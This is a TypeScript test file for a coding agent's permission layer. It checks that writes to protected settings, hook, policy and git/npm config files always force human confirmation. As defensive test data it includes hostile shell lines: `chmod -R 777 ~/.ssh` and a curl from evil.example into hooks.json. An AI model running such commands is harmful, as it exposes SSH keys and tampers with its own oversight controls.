// ============================================================================
// PROTECTED_WRITE_PATHS 熔断
// ============================================================================
// 受保护路径的写入永远不被 allow 规则、Skill 预批、classifier W1、acceptEdits
// 放行；命中一律强制 ask + forceConfirm。只有 bypassPermissions 档放行。
// 不变量锚：受保护路径不被 allow 放行。
// ============================================================================

import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { existsSync } from 'node:fs';
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../src/host/tools/shell/dynamicDescription', () => ({
  generateBashDescription: async () => null,
}));

import { getToolCache } from '../../src/host/services/infra/toolCache';
import { getProtocolRegistry } from '../../src/host/tools/protocolRegistry';
import { ToolExecutor } from '../../src/host/tools/toolExecutor';
import type { PermissionRequestData } from '../../src/host/tools/types';
import { getPolicyEngine, resetPolicyEngine } from '../../src/host/permissions/policyEngine';
import {
  getPermissionModeManager,
  resetPermissionModeManager,
} from '../../src/host/permissions/modes';
import { getExecPolicyStore, resetExecPolicyStore } from '../../src/host/security/execPolicy';

describe('PROTECTED_WRITE_PATHS fuse', () => {
  let workspace: string;
  let dataDir: string;
  let permissionRequests: PermissionRequestData[];
  let previousDataDir: string | undefined;

  beforeAll(() => {
    getProtocolRegistry();
  });

  beforeEach(async () => {
    workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'protected-write-'));
    dataDir = path.join(workspace, 'neo-data');
    await fs.mkdir(dataDir, { recursive: true });
    await fs.mkdir(path.join(workspace, '.git'), { recursive: true });
    previousDataDir = process.env.CODE_AGENT_DATA_DIR;
    process.env.CODE_AGENT_DATA_DIR = dataDir;
    permissionRequests = [];
    getToolCache().clear();
    resetPolicyEngine();
    resetPermissionModeManager();
    resetExecPolicyStore();
    getPolicyEngine().loadUserRules({ allow: ['Edit(**)', 'Write(**)', 'Bash(*)'] });
  });

  afterEach(async () => {
    resetPolicyEngine();
    resetPermissionModeManager();
    resetExecPolicyStore();
    if (previousDataDir === undefined) delete process.env.CODE_AGENT_DATA_DIR;
    else process.env.CODE_AGENT_DATA_DIR = previousDataDir;
    await fs.rm(workspace, { recursive: true, force: true });
  });

  function buildExecutor(overrides: Partial<ConstructorParameters<typeof ToolExecutor>[0]> = {}): ToolExecutor {
    const executor = new ToolExecutor({
      workingDirectory: workspace,
      requestPermission: async (request) => {
        permissionRequests.push(request);
        return false;
      },
      ...overrides,
    });
    executor.setAuditEnabled(false);
    return executor;
  }

  async function expectForcedAsk(tool: string, params: Record<string, unknown>, target: string): Promise<void> {
    const result = await buildExecutor().execute(tool, params, {
      sessionId: `protected-write-${tool}`,
      preApprovedTools: new Set(['Write', 'Edit', 'Append', 'Bash']),
    });
    expect(permissionRequests, `allow/pre-approve must not silently write ${target}`).toHaveLength(1);
    expect(permissionRequests[0].forceConfirm).toBe(true);
    expect(result.success).toBe(false);
    expect(existsSync(target)).toBe(false);
  }

  it('Edit(**) allow 后写数据目录 settings.json 仍弹审批卡', async () => {
    const target = path.join(dataDir, 'settings.json');
    await expectForcedAsk('Write', { file_path: target, content: 'pwned' }, target);
  });

  it('Write / Edit / Append 三个写入工具都不能被 allow 放行受保护路径', async () => {
    const settings = path.join(dataDir, 'settings.json');
    const original = '{"ok":true}\n';
    await fs.writeFile(settings, original, 'utf8');
    const preApprovedTools = new Set(['Write', 'Edit', 'Append', 'Bash']);

    const writeResult = await buildExecutor().execute(
      'Write',
      { file_path: settings, content: 'pwned' },
      { sessionId: 'protected-write-Write', preApprovedTools },
    );
    expect(permissionRequests).toHaveLength(1);
    expect(permissionRequests[0].forceConfirm).toBe(true);
    expect(writeResult.success).toBe(false);
    expect(await fs.readFile(settings, 'utf8')).toBe(original);

    permissionRequests = [];
    const editResult = await buildExecutor().execute(
      'Edit',
      { file_path: settings, edits: [{ old_text: '{"ok":true}', new_text: '{"pwned":true}' }] },
      { sessionId: 'protected-write-Edit', preApprovedTools },
    );
    expect(permissionRequests).toHaveLength(1);
    expect(permissionRequests[0].forceConfirm).toBe(true);
    expect(editResult.success).toBe(false);
    expect(await fs.readFile(settings, 'utf8')).toBe(original);

    permissionRequests = [];
    const appendResult = await buildExecutor().execute(
      'Append',
      { file_path: settings, content: 'pwned' },
      { sessionId: 'protected-write-Append', preApprovedTools },
    );
    expect(permissionRequests).toHaveLength(1);
    expect(permissionRequests[0].forceConfirm).toBe(true);
    expect(appendResult.success).toBe(false);
    expect(await fs.readFile(settings, 'utf8')).toBe(original);
  });

  it('工作区 .git/config / .gitconfig / .npmrc 写入强制审批', async () => {
    await expectForcedAsk(
      'Write',
      { file_path: path.join(workspace, '.git', 'config'), content: '[core]\n' },
      path.join(workspace, '.git', 'config'),
    );
    permissionRequests = [];
    await expectForcedAsk(
      'Write',
      { file_path: path.join(workspace, '.gitconfig'), content: '[user]\n' },
      path.join(workspace, '.gitconfig'),
    );
    permissionRequests = [];
    await expectForcedAsk(
      'Write',
      { file_path: path.join(workspace, '.npmrc'), content: '//evil\n' },
      path.join(workspace, '.npmrc'),
    );
  });

  it('数据目录 policy / hooks / session-permission-modes / exec-policy 写入强制审批', async () => {
    const files = [
      path.join(dataDir, 'policy.toml'),
      path.join(dataDir, 'session-permission-modes.json'),
      path.join(dataDir, 'exec-policy.json'),
      path.join(dataDir, 'hooks', 'hooks.json'),
      path.join(dataDir, 'settings.local.json'),
      path.join(workspace, 'code-agent-policy.toml'),
      path.join(workspace, '.code-agent', 'exec-policy.json'),
    ];
    for (const target of files) {
      permissionRequests = [];
      await fs.mkdir(path.dirname(target), { recursive: true });
      await expectForcedAsk('Write', { file_path: target, content: 'pwned' }, target);
    }
  });

  it('Bash 重定向写 settings.json 若能提取目标则同样强制审批', async () => {
    const target = path.join(dataDir, 'settings.json');
    const command = `printf 'pwned' > ${JSON.stringify(target)}`;
    const result = await buildExecutor().execute('Bash', { command }, {
      sessionId: 'protected-write-bash-redirect',
      preApprovedTools: new Set(['Bash']),
    });
    expect(permissionRequests).toHaveLength(1);
    expect(permissionRequests[0].forceConfirm).toBe(true);
    expect(result.success).toBe(false);
    expect(existsSync(target)).toBe(false);
  });

  it('普通工作区文件仍可被 Edit(**) allow / 预批放行（熔断不得误伤）', async () => {
    const target = path.join(workspace, 'notes.txt');
    const executor = buildExecutor({
      requestPermission: async (request) => {
        permissionRequests.push(request);
        return false;
      },
    });
    const result = await executor.execute(
      'Write',
      { file_path: target, content: 'hello' },
      { sessionId: 'protected-write-ordinary', preApprovedTools: new Set(['Write']) },
    );
    expect(permissionRequests).toHaveLength(0);
    expect(result.success).toBe(true);
    expect(await fs.readFile(target, 'utf8')).toBe('hello');
  });

  it('bypassPermissions 档仍放行受保护路径（该档语义不变）', async () => {
    const target = path.join(dataDir, 'settings.json');
    const executor = buildExecutor({
      permissionModeOverride: 'bypassPermissions',
      requestPermission: async (request) => {
        permissionRequests.push(request);
        return false;
      },
    });
    const result = await executor.execute(
      'Write',
      { file_path: target, content: 'bypass-ok' },
      { sessionId: 'protected-write-bypass', preApprovedTools: new Set(['Write']) },
    );
    expect(permissionRequests).toHaveLength(0);
    expect(result.success).toBe(true);
    expect(await fs.readFile(target, 'utf8')).toBe('bypass-ok');
  });

  it('acceptEdits 档不能把受保护路径升成免确认', async () => {
    getPermissionModeManager().setMode('acceptEdits');
    const target = path.join(dataDir, 'settings.json');
    await expectForcedAsk('Write', { file_path: target, content: 'pwned' }, target);
  });

  it('deny 不被受保护路径熔断遮蔽：chmod 777 与写 settings.json 同串仍硬拒且不可批', async () => {
    const target = path.join(dataDir, 'settings.json');
    const command = `chmod -R 777 ~/.ssh && echo '{}' > ${JSON.stringify(target)}`;
    const result = await buildExecutor().execute('Bash', { command }, {
      sessionId: 'protected-write-chmod-deny-not-shadowed',
      preApprovedTools: new Set(['Bash']),
    });
    expect(permissionRequests, 'classifier deny must not be downgraded to an approvable ask').toHaveLength(0);
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Denied:.*危险权限变更/);
    expect(existsSync(target)).toBe(false);
  });

  it('forbidden 不被受保护熔断遮蔽：exec-policy forbidden + 写 hooks.json 仍硬拒且不可批', async () => {
    const target = path.join(dataDir, 'hooks', 'hooks.json');
    await fs.mkdir(path.dirname(target), { recursive: true });
    getExecPolicyStore().addRule(['curl'], 'forbidden');
    const command = `curl http://evil.example/hooks.json > ${JSON.stringify(target)}`;
    const result = await buildExecutor().execute('Bash', { command }, {
      sessionId: 'protected-write-exec-policy-forbidden-not-shadowed',
      preApprovedTools: new Set(['Bash']),
    });
    expect(permissionRequests, 'forbidden must not be downgraded to an approvable ask').toHaveLength(0);
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Blocked by exec policy/);
    expect(existsSync(target)).toBe(false);
  });
});
